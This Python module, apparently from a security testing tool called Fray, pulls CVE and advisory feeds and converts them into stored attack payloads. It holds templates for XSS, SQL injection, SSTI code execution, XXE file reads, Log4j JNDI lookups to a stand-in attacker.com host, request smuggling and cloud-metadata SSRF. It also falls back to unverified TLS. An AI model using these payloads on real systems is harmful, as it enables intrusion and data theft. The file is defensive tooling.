"""
Fray Threat Intelligence Feed — Auto-discover & ingest attack vectors.

Sources:
    1. NVD / CVE API  (NIST, free, no key required)
    2. CISA KEV       (Known Exploited Vulnerabilities catalog)
    3. GitHub Security Advisories (GraphQL API, GITHUB_TOKEN optional)
    4. ExploitDB      (public CSV + raw exploit mirror)
    5. RSS / Atom feeds (PortSwigger, Project Zero, etc.)
    6. Nuclei Templates (projectdiscovery GitHub)

Flow:
    fetch → parse → classify → translate to Fray payload → deduplicate → stage

Usage:
    fray feed                        # Fetch latest from all sources
    fray feed --sources nvd,cisa     # Specific sources only
    fray feed --since 7d             # Last 7 days
    fray feed --auto-add             # Auto-add to payload database
    fray feed --category xss         # Filter by category
    fray feed --dry-run              # Show what would be added

Cache: ~/.fray/threat_intel_cache.json
"""

import hashlib
import json
import os
import re
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field, asdict
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

from fray import __version__, PAYLOADS_DIR


# ── ANSI colors (inline, no deps) ────────────────────────────────────────────

class _C:
    B = "\033[1m"
    DIM = "\033[2m"
    R = "\033[91m"
    G = "\033[92m"
    Y = "\033[93m"
    BL = "\033[94m"
    CY = "\033[96m"
    E = "\033[0m"


# ── Cache ─────────────────────────────────────────────────────────────────────

_CACHE_DIR = Path.home() / ".fray"
_CACHE_FILE = _CACHE_DIR / "threat_intel_cache.json"
_STAGING_DIR = _CACHE_DIR / "staged_payloads"


def _load_cache() -> Dict:
    if _CACHE_FILE.exists():
        try:
            return json.loads(_CACHE_FILE.read_text(encoding="utf-8"))
        except (json.JSONDecodeError, OSError):
            pass
    return {
        "version": 1,
        "seen_cves": [],
        "seen_hashes": [],
        "last_fetch": {},
        "stats": {"total_fetched": 0, "total_added": 0, "total_skipped": 0},
    }


def _save_cache(cache: Dict) -> None:
    _CACHE_DIR.mkdir(parents=True, exist_ok=True)
    # Trim to prevent unbounded growth
    cache["seen_cves"] = cache["seen_cves"][-5000:]
    cache["seen_hashes"] = cache["seen_hashes"][-10000:]
    _CACHE_FILE.write_text(json.dumps(cache, indent=2, ensure_ascii=False),
                            encoding="utf-8")


# ── Payload schema ────────────────────────────────────────────────────────────

@dataclass
class ThreatPayload:
    """A payload discovered from threat intelligence."""
    payload: str
    category: str
    subcategory: str = ""
    description: str = ""
    cve: str = ""
    severity: str = "high"
    source: str = ""
    reference: str = ""
    technique: str = ""
    date_discovered: str = ""
    tags: List[str] = field(default_factory=list)

    @property
    def hash(self) -> str:
        return hashlib.sha256(self.payload.encode("utf-8", "replace")).hexdigest()[:16]

    def to_fray_format(self, idx: int = 0) -> Dict:
        """Convert to Fray payload JSON format."""
        entry = {
            "id": f"threat-intel-{self.cve or self.hash}-{idx:04d}",
            "category": self.category,
            "subcategory": self.subcategory or f"threat_intel_{self.category}",
            "payload": self.payload,
            "description": self.description,
            "source": self.source,
            "tested_against": [],
            "success_rate": 0.0,
            "blocked": False,
        }
        if self.cve:
            entry["cve"] = self.cve
        if self.severity:
            entry["severity"] = self.severity
        if self.reference:
            entry["reference"] = self.reference
        if self.technique:
            entry["technique"] = self.technique
        if self.date_discovered:
            entry["date_discovered"] = self.date_discovered
        if self.tags:
            entry["tags"] = self.tags
        return entry


# ── Stats ─────────────────────────────────────────────────────────────────────

@dataclass
class FeedStats:
    sources_queried: int = 0
    items_fetched: int = 0
    payloads_extracted: int = 0
    payloads_new: int = 0
    payloads_duplicate: int = 0
    payloads_added: int = 0
    payloads_tested: int = 0
    payloads_bypassed: int = 0
    payloads_blocked: int = 0
    test_target: str = ""
    errors: List[str] = field(default_factory=list)


# ── HTTP helper (stdlib only) ─────────────────────────────────────────────────

def _http_get(url: str, headers: Optional[Dict] = None,
              timeout: int = 15) -> Optional[str]:
    """Simple HTTP GET using urllib (no deps). Falls back to unverified SSL."""
    req = urllib.request.Request(url, method="GET")
    req.add_header("User-Agent", f"Fray/{__version__} ThreatIntel")
    req.add_header("Accept", "application/json, application/xml, text/html, */*")
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)
    # Try with default SSL first, fallback to unverified
    for use_unverified in (False, True):
        try:
            if use_unverified:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
            else:
                resp = urllib.request.urlopen(req, timeout=timeout)
            return resp.read().decode("utf-8", errors="replace")
        except (ssl.SSLError, ssl.CertificateError):
            if not use_unverified:
                continue
            return None
        except urllib.error.URLError as e:
            # URLError may wrap an SSL error
            if not use_unverified and "SSL" in str(e):
                continue
            if not use_unverified:
                continue
            return None
        except urllib.error.HTTPError:
            return None
        except Exception:
            if not use_unverified:
                continue
            return None
    return None


def _http_get_json(url: str, headers: Optional[Dict] = None,
                   timeout: int = 15) -> Optional[Dict]:
    body = _http_get(url, headers, timeout)
    if body:
        try:
            return json.loads(body)
        except json.JSONDecodeError:
            pass
    return None


# ── Category classifier ──────────────────────────────────────────────────────

# Maps keywords found in CVE descriptions / payloads → Fray category
_CATEGORY_RULES: List[Tuple[str, List[str]]] = [
    ("xss", ["cross-site scripting", "xss", "script injection",
             "reflected xss", "stored xss", "dom-based xss",
             "<script", "onerror=", "onload=", "javascript:",
             "alert(", "document.cookie", "innerHTML"]),
    ("sqli", ["sql injection", "sqli", "sql command", "sql query",
              "blind sql", "union select", "' or '", "1=1",
              "information_schema", "sqlmap", "order by"]),
    ("ssrf", ["server-side request forgery", "ssrf",
              "internal network", "localhost", "169.254",
              "metadata", "cloud-metadata", "file://",
              "gopher://", "dict://"]),
    ("ssti", ["template injection", "ssti", "server-side template",
              "jinja2", "twig", "freemarker", "velocity",
              "{{", "${", "#{T("]),
    ("command_injection", ["command injection", "rce", "remote code execution",
                           "os command", "shell injection", "exec(",
                           "system(", "popen(", "child_process",
                           "; ls", "| cat", "`whoami`",
                           "code execution", "arbitrary command"]),
    ("xxe", ["xml external entity", "xxe", "xml injection",
             "<!entity", "<!doctype", "file:///etc/passwd",
             "expect://"]),
    ("path_traversal", ["path traversal", "directory traversal",
                        "lfi", "local file inclusion",
                        "../", "..\\", "/etc/passwd",
                        "..%2f", "..%5c"]),
    ("open_redirect", ["open redirect", "url redirect", "redirect=",
                       "returnurl=", "next=", "dest=", "return_to=",
                       "unvalidated redirect", "redirect injection",
                       "redirect uri", "oauth redirect", "redirect bypass",
                       "redirect validation"]),
    ("prototype_pollution", ["prototype pollution", "__proto__",
                              "constructor.prototype",
                              "object.assign"]),
    ("crlf_injection", ["crlf injection", "http header injection",
                        "response splitting", "%0d%0a",
                        "\\r\\n", "header injection"]),
    ("file_upload", ["file upload", "unrestricted upload",
                     "web shell", "malicious file",
                     ".php", ".jsp", ".asp"]),
    ("csp_bypass", ["csp bypass", "content security policy",
                    "csp violation", "unsafe-inline",
                    "unsafe-eval", "nonce"]),
    # ── New categories ────────────────────────────────────────
    ("auth_bypass", ["authentication bypass", "auth bypass", "login bypass",
                     "access control", "broken authentication",
                     "improper authentication", "unauthorized access",
                     "privilege escalation", "improper access control",
                     "broken access control", "idor",
                     "insecure direct object reference",
                     "missing authorization", "authorization bypass",
                     "permission bypass", "account takeover"]),
    ("deserialization", ["deserialization", "deserialize", "unserialize",
                         "object injection", "java deserialization",
                         "pickle", "marshal", "yaml.load",
                         "insecure deserialization", "gadget chain",
                         "ysoserial", "phpggc"]),
    ("http2", ["http/2", "h2c smuggling", "hpack", "hpack bomb",
               "continuation flood", "rapid reset", "h2 desync",
               "http2 smuggling", "pseudo-header", "stream reset",
               "h2c upgrade", "cve-2023-44487", "cve-2024-27983"]),
    ("http_smuggling", ["request smuggling", "http smuggling",
                        "desync", "cl.te", "te.cl", "transfer-encoding",
                        "content-length", "http/2 smuggling",
                        "h2c smuggling", "request splitting"]),
    ("jwt_attack", ["jwt", "json web token", "jwt forgery",
                    "jwt bypass", "alg none", "jwk injection",
                    "token forging", "weak signing",
                    "jwt secret", "token tampering"]),
    ("graphql", ["graphql", "introspection", "graphql injection",
                 "batching attack", "query depth",
                 "graphql dos", "__schema"]),
    ("cors", ["cors misconfiguration", "cross-origin",
              "access-control-allow-origin", "cors bypass",
              "origin reflection", "cors wildcard"]),
    ("websocket", ["websocket", "ws://", "wss://",
                   "websocket hijacking", "cross-site websocket",
                   "cswsh", "websocket injection"]),
    ("dns_rebinding", ["dns rebinding", "dns rebind",
                       "toctou", "time-of-check"]),
    ("race_condition", ["race condition", "toctou",
                        "time-of-check-to-time-of-use",
                        "concurrency", "double spend"]),
    ("api_security", ["api abuse", "api key", "api exposure",
                      "broken object level", "bola", "bfla",
                      "mass assignment", "excessive data exposure",
                      "improper inventory", "rate limiting"]),
    ("cache_poisoning", ["cache poisoning", "web cache",
                         "cache deception", "cache key",
                         "host header injection"]),
    ("subdomain_takeover", ["subdomain takeover", "dangling dns",
                            "unclaimed subdomain", "cname"]),
    ("crypto_failures", ["weak cryptography", "broken crypto",
                         "weak cipher", "insufficient entropy",
                         "hardcoded secret", "hardcoded password",
                         "plaintext password", "weak hash",
                         "md5", "sha1", "weak key"]),
    ("log4j", ["log4j", "log4shell", "jndi", "jndi:ldap",
               "jndi:rmi", "jndi:dns"]),
    ("buffer_overflow", ["buffer overflow", "stack overflow",
                         "heap overflow", "out of bounds",
                         "memory corruption", "use-after-free"]),
    ("information_disclosure", ["information disclosure", "info leak",
                                "sensitive data exposure", "data leak",
                                "directory listing", "stack trace",
                                "error message", "debug mode"]),
    ("ssrf", ["dns rebinding", "internal service",
              "cloud metadata"]),
    # ── Gaps fixed: csrf, dos, nextjs ──────────────────────────────────────
    ("csrf", ["cross-site request forgery", "csrf", "xsrf",
              "null origin", "origin bypass", "origin header",
              "server action", "server actions", "sandboxed iframe",
              "same-site", "samesite", "request forgery",
              "forged request", "state-changing"]),
    ("denial_of_service", ["denial of service", "dos", "ddos",
                           "resource exhaustion", "resource consumption",
                           "unbounded", "memory exhaustion", "oom",
                           "infinite loop", "algorithmic complexity",
                           "buffering", "oversized", "allocation without limit",
                           "next-resume", "ppr", "postponed"]),
    ("nextjs", ["next.js", "nextjs", "next js",
                "x-middleware-subrequest", "middleware bypass",
                "server actions", "app router", "pages router",
                "partial prerendering", "next-resume",
                "/_next/", "__next_data__", "getserversideprops",
                "rewrite", "next.config"]),
    # ── Tech-stack specific categories (used by vendor blog research) ─────────
    # These allow classify_category to route tech-specific CVEs to the
    # correct check function in the recon pipeline automatically.
    ("wordpress", ["wordpress", "wp-admin", "wp-content", "wp-login",
                   "wp-includes", "woocommerce", "elementor", "wpforms",
                   "xmlrpc.php", "wordpress plugin", "wp plugin",
                   "wordpress theme", "wp vulnerability"]),
    ("spring", ["spring framework", "spring boot", "spring4shell",
                "cve-2022-22965", "requestmapping", "spring mvc",
                "spring cloud", "spring security", "spring rce",
                "log4shell spring", "autoconfiguration"]),
    ("log4j", ["log4j", "log4shell", "cve-2021-44228", "jndi",
               "jndi:ldap", "jndi:rmi", "jndi:dns", "log4j2",
               "log4j rce", "jndi injection"]),
    ("drupal", ["drupal", "drupalgeddon", "cve-2018-7600",
                "cve-2018-7602", "cve-2019-6340",
                "drupal rce", "drupal xss", "drupal sqli",
                "/node/", "drupal core"]),
    ("joomla", ["joomla", "cve-2015-8562", "cve-2017-8917",
                "joomla rce", "joomla sqli", "/administrator",
                "joomla core"]),
    ("php", ["php deserialization", "php object injection",
             "php type juggling", "php rfi", "php lfi",
             "php webshell", "php info disclosure",
             "phpinfo", "php open basedir"]),
    ("java_deserialization", ["java deserialization", "ysoserial",
                              "commons collections", "java gadget",
                              "t3 protocol", "java rmi",
                              "weblogic deserialization",
                              "jboss deserialization"]),
    ("aws_cloud", ["aws lambda", "s3 bucket", "iam role",
                   "ec2 metadata", "imdsv1", "imds bypass",
                   "aws cognito", "bedrock", "sagemaker",
                   "ecs task", "ecr registry", "eks cluster"]),
    ("kubernetes", ["kubernetes", "k8s", "kubectl", "pod escape",
                    "container escape", "rbac misconfiguration",
                    "service account token", "kube-apiserver",
                    "etcd", "helm chart", "namespace bypass"]),
    ("llm", ["large language model", "llm", "gpt", "claude",
              "chatgpt", "prompt injection", "jailbreak",
              "ai bypass", "system prompt", "rag injection",
              "model extraction", "adversarial prompt",
              "indirect injection", "llm dos"]),
]

# ── Tech-stack to recon check mapping ────────────────────────────────────────
# When classify_category returns one of these tech stacks, the recon pipeline
# will dispatch the corresponding check function if that tech is fingerprinted.
# New entries here automatically wire into `fray go` without pipeline changes.
_TECH_CHECK_MAP: Dict[str, str] = {
    "nextjs":              "check_nextjs_cves",
    "wordpress":           "check_wordpress_cves",
    "log4j":               "check_log4shell",
    "spring":              "check_spring4shell",
    "drupal":              "check_drupal_cves",
    "aws_cloud":           "check_aws_metadata_ssrf",
    "kubernetes":          "check_k8s_exposure",
}


def classify_category(text: str, payload: str = "") -> str:
    """Classify a CVE/advisory into a Fray payload category.

    Scoring:
    - Each keyword match = 1 point
    - Tech-stack categories (wordpress, log4j, spring, drupal, llm, etc.)
      get a 3x multiplier when their primary tech name appears in the text.
      This prevents "rce in wordpress" from being classified as
      command_injection instead of wordpress.
    """
    combined = (text + " " + payload).lower()
    scores: Dict[str, int] = {}

    # Tech-stack categories that should win when their name is strongly present
    _TECH_BOOST_MAP = {
        "wordpress": ["wordpress", "wp-"],
        "spring":    ["spring framework", "spring boot", "spring4shell"],
        "log4j":     ["log4j", "log4shell", "jndi"],
        "drupal":    ["drupal", "drupalgeddon"],
        "joomla":    ["joomla"],
        "nextjs":    ["next.js", "nextjs", "next js"],
        "llm":       ["large language model", "llm", "prompt injection",
                      "jailbreak", "chatgpt", "claude api", "openai api"],
        "aws_cloud": ["aws lambda", "s3 bucket", "iam role", "imds",
                      "ec2 metadata"],
        "kubernetes": ["kubernetes", "k8s", "kubectl"],
        "php":       ["php deserialization", "php object injection",
                      "php type juggling"],
        "java_deserialization": ["ysoserial", "java deserialization",
                                 "commons collections"],
    }

    for cat, keywords in _CATEGORY_RULES:
        score = sum(1 for kw in keywords if kw.lower() in combined)
        if score > 0:
            # Apply tech-stack boost: multiply score if primary name present
            boost_terms = _TECH_BOOST_MAP.get(cat, [])
            if boost_terms and any(bt in combined for bt in boost_terms):
                score = score * 3  # 3x boost for tech-name match
            scores[cat] = scores.get(cat, 0) + score

    if not scores:
        return "other"
    return max(scores, key=lambda k: scores[k])


def classify_severity(cvss: float) -> str:
    if cvss >= 9.0:
        return "critical"
    if cvss >= 7.0:
        return "high"
    if cvss >= 4.0:
        return "medium"
    return "low"


# ── Payload extraction patterns ──────────────────────────────────────────────

# Regex patterns to extract payload-like strings from advisory text / PoC code
_PAYLOAD_PATTERNS = [
    # XSS patterns
    re.compile(r'<script[^>]*>.*?</script>', re.IGNORECASE | re.DOTALL),
    re.compile(r'<\w+\s+on\w+\s*=\s*["\']?[^"\'>\s]+', re.IGNORECASE),
    re.compile(r'javascript:\s*\S+', re.IGNORECASE),
    # SQLi patterns
    re.compile(r"(?:' (?:OR|AND|UNION)\s+.{5,60})", re.IGNORECASE),
    re.compile(r"(?:UNION\s+(?:ALL\s+)?SELECT\s+.{5,80})", re.IGNORECASE),
    # Command injection
    re.compile(r'(?:;|\||\$\()\s*(?:ls|cat|id|whoami|curl|wget|nc)\b[^"\']{0,60}',
               re.IGNORECASE),
    # SSTI
    re.compile(r'\{\{.*?\}\}'),
    re.compile(r'\$\{[^}]{3,80}\}'),
    # Path traversal
    re.compile(r'(?:\.\./){2,}[\w/]+'),
    # SSRF
    re.compile(r'(?:file|gopher|dict|ftp)://\S+', re.IGNORECASE),
    # XXE
    re.compile(r'<!(?:DOCTYPE|ENTITY)\s+\S+.*?>', re.IGNORECASE | re.DOTALL),
]


def extract_payloads_from_text(text: str, category: str = "",
                                source: str = "") -> List[ThreatPayload]:
    """Extract payload-like strings from advisory/PoC text."""
    results = []
    seen = set()
    for pat in _PAYLOAD_PATTERNS:
        for match in pat.finditer(text):
            payload_str = match.group(0).strip()
            if len(payload_str) < 5 or len(payload_str) > 2000:
                continue
            h = hashlib.sha256(payload_str.encode()).hexdigest()[:16]
            if h in seen:
                continue
            seen.add(h)
            cat = category or classify_category("", payload_str)
            results.append(ThreatPayload(
                payload=payload_str,
                category=cat,
                source=source,
            ))
    return results


# ── CVE → Payload translator ─────────────────────────────────────────────────

# Well-known CVE payload templates per vulnerability class
_CVE_PAYLOAD_TEMPLATES: Dict[str, List[Dict]] = {
    "xss": [
        {"tpl": "<script>alert('{cve}')</script>", "sub": "reflected_xss"},
        {"tpl": "<img src=x onerror=alert('{cve}')>", "sub": "event_handler"},
        {"tpl": "<svg/onload=alert('{cve}')>", "sub": "svg_xss"},
        {"tpl": "javascript:alert('{cve}')", "sub": "javascript_uri"},
    ],
    "sqli": [
        {"tpl": "' OR 1=1-- /* {cve} */", "sub": "auth_bypass"},
        {"tpl": "' UNION SELECT null,version()-- /* {cve} */", "sub": "union_based"},
        {"tpl": "1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- /* {cve} */", "sub": "error_based"},
    ],
    "ssrf": [
        {"tpl": "http://169.254.169.254/latest/meta-data/", "sub": "aws_metadata"},
        {"tpl": "http://metadata.google.internal/computeMetadata/v1/", "sub": "gcp_metadata"},
        {"tpl": "file:///etc/passwd", "sub": "file_read"},
    ],
    "command_injection": [
        {"tpl": "; id # {cve}", "sub": "basic_rce"},
        {"tpl": "| cat /etc/passwd # {cve}", "sub": "pipe_rce"},
        {"tpl": "`whoami` # {cve}", "sub": "backtick_rce"},
        {"tpl": "${{IFS}}cat${{IFS}}/etc/passwd # {cve}", "sub": "ifs_bypass"},
    ],
    "ssti": [
        {"tpl": "{{{{7*7}}}}", "sub": "detection"},
        {"tpl": "${{7*7}}", "sub": "el_detection"},
        {"tpl": "{{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}", "sub": "jinja2_rce"},
    ],
    "xxe": [
        {"tpl": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', "sub": "basic_xxe"},
        {"tpl": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe">]><foo>&xxe;</foo>', "sub": "oob_xxe"},
    ],
    "path_traversal": [
        {"tpl": "../../../../etc/passwd", "sub": "basic_lfi"},
        {"tpl": "..%2f..%2f..%2f..%2fetc%2fpasswd", "sub": "encoded_lfi"},
        {"tpl": "....//....//....//....//etc/passwd", "sub": "double_dot_lfi"},
    ],
    "auth_bypass": [
        {"tpl": "admin' --", "sub": "sql_auth_bypass"},
        {"tpl": "{\"role\": \"admin\", \"user\": \"attacker\"}", "sub": "role_escalation"},
        {"tpl": "X-Forwarded-For: 127.0.0.1", "sub": "ip_bypass"},
        {"tpl": "/admin/../admin", "sub": "path_normalization"},
    ],
    "deserialization": [
        {"tpl": 'O:8:"Exploit":1:{{s:4:"exec";s:2:"id";}}', "sub": "php_unserialize"},
        {"tpl": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==", "sub": "java_base64"},
        {"tpl": "__import__('os').popen('id').read()", "sub": "python_pickle"},
    ],
    "http2": [
        {"tpl": ":method: GET\r\n:path: /admin\r\n:authority: internal.target.com\r\n:scheme: https", "sub": "pseudo_header_smuggling"},
        {"tpl": "GET / HTTP/1.1\r\nHost: target\r\nUpgrade: h2c\r\nHTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA\r\nConnection: Upgrade, HTTP2-Settings", "sub": "h2c_smuggling"},
        {"tpl": ":method: CONNECT\r\n:authority: internal-service:8080", "sub": "h2_connect_tunnel"},
        {"tpl": "CONTINUATION frame flood: 10000 frames, each with 1 byte header fragment", "sub": "continuation_flood"},
    ],
    "http_smuggling": [
        {"tpl": "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 13\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\n", "sub": "cl_te"},
        {"tpl": "GET / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: x\r\n\r\n", "sub": "te_te"},
    ],
    "jwt_attack": [
        {"tpl": 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.', "sub": "alg_none"},
        {"tpl": '{"alg":"HS256","typ":"JWT"}.{"sub":"admin","role":"admin"}', "sub": "token_forge"},
    ],
    "graphql": [
        {"tpl": '{"query":"{__schema{types{name,fields{name}}}}"} ', "sub": "introspection"},
        {"tpl": '{"query":"query{user(id:1){id,email,password}}"}', "sub": "data_extraction"},
    ],
    "cors": [
        {"tpl": "Origin: https://evil.com", "sub": "origin_test"},
        {"tpl": "Origin: null", "sub": "null_origin"},
    ],
    "open_redirect": [
        {"tpl": "//evil.com", "sub": "protocol_relative"},
        {"tpl": "/\\evil.com", "sub": "backslash_bypass"},
        {"tpl": "https://target.com@evil.com", "sub": "at_sign_bypass"},
    ],
    "websocket": [
        {"tpl": "GET / HTTP/1.1\r\nUpgrade: websocket\r\nOrigin: https://evil.com\r\n", "sub": "cswsh"},
    ],
    "cache_poisoning": [
        {"tpl": "X-Forwarded-Host: evil.com", "sub": "host_override"},
        {"tpl": "X-Original-URL: /admin", "sub": "path_override"},
    ],
    "log4j": [
        {"tpl": "${{jndi:ldap://attacker.com/a}}", "sub": "basic_jndi"},
        {"tpl": "${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://attacker.com/a}}", "sub": "obfuscated_jndi"},
    ],
    "api_security": [
        {"tpl": "GET /api/v1/users/2 HTTP/1.1", "sub": "bola"},
        {"tpl": '{"role":"admin","isAdmin":true}', "sub": "mass_assignment"},
    ],
    "information_disclosure": [
        {"tpl": "GET /.env HTTP/1.1", "sub": "env_file"},
        {"tpl": "GET /server-status HTTP/1.1", "sub": "server_status"},
        {"tpl": "GET /.git/config HTTP/1.1", "sub": "git_exposure"},
    ],
    "crypto_failures": [
        {"tpl": "GET /api/token?alg=none HTTP/1.1", "sub": "weak_alg"},
    ],
    # ── New templates for gaps ────────────────────────────────────────────
    "csrf": [
        {"tpl": "Origin: null", "sub": "null_origin_csrf"},
        {"tpl": "POST /_next/server-action HTTP/1.1\r\nOrigin: null\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n$ACTION_ID=ID", "sub": "nextjs_null_origin_csrf"},
        {"tpl": "<form action='https://TARGET/api/action' method='POST'><input name='$ACTION_ID' value='ACTION_ID'></form><script>document.forms[0].submit()</script>", "sub": "csrf_poc_form"},
        {"tpl": "Origin: https://evil.com\r\nReferer: https://evil.com/", "sub": "cross_origin_csrf"},
    ],
    "denial_of_service": [
        {"tpl": "POST / HTTP/1.1\r\nnext-resume: 1\r\nContent-Type: application/octet-stream\r\nContent-Length: 104857600\r\n\r\n[oversized body]", "sub": "nextjs_ppr_resume_dos"},
        {"tpl": "GET /api/endpoint HTTP/1.1\r\nContent-Length: 2147483647\r\n\r\n", "sub": "large_content_length_dos"},
        {"tpl": "X-Recursive: " + "A"*10000, "sub": "oversized_header_dos"},
    ],
    "nextjs": [
        {"tpl": "GET /admin HTTP/1.1\r\nx-middleware-subrequest: middleware\r\n", "sub": "middleware_auth_bypass"},
        {"tpl": "GET /protected HTTP/1.1\r\nx-middleware-subrequest: src/middleware\r\n", "sub": "middleware_src_bypass"},
        {"tpl": "POST /_next/server-action HTTP/1.1\r\nOrigin: null\r\n", "sub": "server_action_null_origin"},
        {"tpl": "DELETE /api/rewrite-route HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\n", "sub": "nextjs_smuggling"},
        {"tpl": "GET /_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=75 HTTP/1.1", "sub": "nextjs_image_ssrf"},
    ],
}


def cve_to_payloads(cve_id: str, description: str, category: str = "",
                     severity: str = "high", source: str = "",
                     reference: str = "",
                     extra_payloads: List[str] = None) -> List[ThreatPayload]:
    """Translate a CVE advisory into Fray payloads."""
    cat = category or classify_category(description)
    results = []
    now = datetime.now(timezone.utc).strftime("%Y-%m-%d")

    # Generate from templates
    templates = _CVE_PAYLOAD_TEMPLATES.get(cat, [])
    for tpl in templates:
        payload_str = tpl["tpl"].replace("{cve}", cve_id)
        results.append(ThreatPayload(
            payload=payload_str,
            category=cat,
            subcategory=tpl.get("sub", ""),
            description=f"{cve_id}: {description[:120]}",
            cve=cve_id,
            severity=severity,
            source=source or "threat_intel",
            reference=reference,
            technique=tpl.get("sub", ""),
            date_discovered=now,
            tags=["auto-generated", "threat-intel", cve_id.lower()],
        ))

    # Fallback: if no templates for this category, generate a generic reference payload
    if not templates and not extra_payloads:
        results.append(ThreatPayload(
            payload=f"# {cve_id} — {description[:200]}",
            category=cat,
            subcategory=f"cve_{cat}",
            description=f"{cve_id}: {description[:120]}",
            cve=cve_id,
            severity=severity,
            source=source or "threat_intel",
            reference=reference,
            technique=cat,
            date_discovered=now,
            tags=["cve-reference", "threat-intel", cve_id.lower()],
        ))

    # Extract payloads from description text
    text_payloads = extract_payloads_from_text(description, cat, source)
    for tp in text_payloads:
        tp.cve = cve_id
        tp.severity = severity
        tp.description = f"{cve_id}: extracted from advisory"
        tp.reference = reference
        tp.date_discovered = now
        tp.tags = ["extracted", "threat-intel", cve_id.lower()]
        results.append(tp)

    # Add any extra payloads (e.g. from PoC code)
    if extra_payloads:
        for i, ep in enumerate(extra_payloads):
            results.append(ThreatPayload(
                payload=ep,
                category=cat,
                subcategory=f"poc_{cat}",
                description=f"{cve_id}: PoC payload #{i+1}",
                cve=cve_id,
                severity=severity,
                source=source or "poc",
                reference=reference,
                technique="poc_extracted",
                date_discovered=now,
                tags=["poc", "threat-intel", cve_id.lower()],
            ))

    return results


# ══════════════════════════════════════════════════════════════════════════════
#  SOURCE FETCHERS
# ══════════════════════════════════════════════════════════════════════════════


# ── 1. NVD / CVE API ─────────────────────────────────────────────────────────

def fetch_nvd(since_days: int = 7, category_filter: str = "",
              max_results: int = 50,
              enrich_poc: bool = False,
              verbose: bool = True) -> List[ThreatPayload]:
    """Fetch recent CVEs from NIST NVD API 2.0 (free, no key required).

    If enrich_poc=True, also scrapes GitHub/PacketStorm for real PoC payloads.
    """
    now = datetime.now(timezone.utc)
    start = now - timedelta(days=since_days)
    start_str = start.strftime("%Y-%m-%dT%H:%M:%S.000+00:00")
    end_str = now.strftime("%Y-%m-%dT%H:%M:%S.000+00:00")

    base = "https://services.nvd.nist.gov/rest/json/cves/2.0"
    params = {
        "pubStartDate": start_str,
        "pubEndDate": end_str,
        "resultsPerPage": str(min(max_results, 100)),
    }

    # Filter for web-related CVEs if category specified
    keyword_map = {
        "xss": "cross-site scripting",
        "sqli": "SQL injection",
        "ssrf": "server-side request forgery",
        "rce": "remote code execution",
        "command_injection": "command injection",
        "xxe": "XML external entity",
        "ssti": "template injection",
        "path_traversal": "path traversal",
    }
    if category_filter and category_filter in keyword_map:
        params["keywordSearch"] = keyword_map[category_filter]

    url = f"{base}?{urllib.parse.urlencode(params)}"
    if verbose:
        print(f"    {_C.DIM}NVD API: fetching CVEs since {start.strftime('%Y-%m-%d')}...{_C.E}")

    data = _http_get_json(url, timeout=30)
    if not data:
        if verbose:
            print(f"    {_C.R}NVD API: failed to fetch{_C.E}")
        return []

    results = []
    vulnerabilities = data.get("vulnerabilities", [])
    if verbose:
        print(f"    {_C.DIM}NVD: {len(vulnerabilities)} CVEs found{_C.E}")

    for vuln in vulnerabilities:
        cve_data = vuln.get("cve", {})
        cve_id = cve_data.get("id", "")
        if not cve_id:
            continue

        # Get description
        desc_list = cve_data.get("descriptions", [])
        description = ""
        for d in desc_list:
            if d.get("lang") == "en":
                description = d.get("value", "")
                break
        if not description and desc_list:
            description = desc_list[0].get("value", "")

        # Get CVSS score
        metrics = cve_data.get("metrics", {})
        cvss = 0.0
        for key in ["cvssMetricV31", "cvssMetricV30", "cvssMetricV2"]:
            metric_list = metrics.get(key, [])
            if metric_list:
                cvss = metric_list[0].get("cvssData", {}).get("baseScore", 0.0)
                break

        # Only process high/critical CVEs for web categories
        if cvss < 6.0:
            continue

        severity = classify_severity(cvss)
        cat = classify_category(description)

        # If user specified a category filter, skip non-matching
        if category_filter and cat != category_filter:
            continue

        # Get references for PoC links
        refs = cve_data.get("references", [])
        ref_url = ""
        poc_urls = []
        for r in refs:
            url_r = r.get("url", "")
            if not ref_url:
                ref_url = url_r
            tags_r = r.get("tags", [])
            if "Exploit" in tags_r or "exploit" in url_r.lower():
                poc_urls.append(url_r)

        # Extract real PoC payloads — always search all 8 sources for
        # high-severity CVEs, don't wait for NVD to tag "Exploit" references
        extra_poc = []
        if enrich_poc and cvss >= 7.0:
            try:
                from fray.poc_extractor import extract_poc_payloads
                poc_result = extract_poc_payloads(
                    cve_id=cve_id, cve_data=cve_data,
                    max_sources=3, timeout=12, delay=0.5,
                )
                for ep in poc_result.extracted_payloads:
                    extra_poc.append(ep.get("payload", "")[:500])
                if verbose and extra_poc:
                    print(f"    {_C.G}PoC: {cve_id} — {len(extra_poc)} real payloads extracted{_C.E}")
            except Exception:
                pass

        payloads = cve_to_payloads(
            cve_id=cve_id,
            description=description,
            category=cat,
            severity=severity,
            source=f"NVD (CVSS {cvss})",
            reference=ref_url,
            extra_payloads=extra_poc if extra_poc else None,
        )
        results.extend(payloads)

    return results


# ── 2. CISA KEV ──────────────────────────────────────────────────────────────

def fetch_cisa_kev(since_days: int = 30,
                   enrich_poc: bool = True,
